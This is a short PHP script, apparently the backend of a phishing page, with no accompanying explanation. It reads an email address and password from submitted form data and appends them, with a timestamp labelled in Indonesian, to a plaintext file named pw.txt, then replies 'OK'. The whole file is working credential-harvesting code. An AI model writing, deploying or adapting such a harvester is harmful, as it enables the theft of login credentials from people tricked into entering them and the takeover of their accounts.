<?php
file_put_contents("pw.txt",
"user: ".$_POST['email']." | pw: ".$_POST['pw']." | waktu: ".date('Y-m-d H:i:s')."\n",
FILE_APPEND
);
echo "OK";
?>
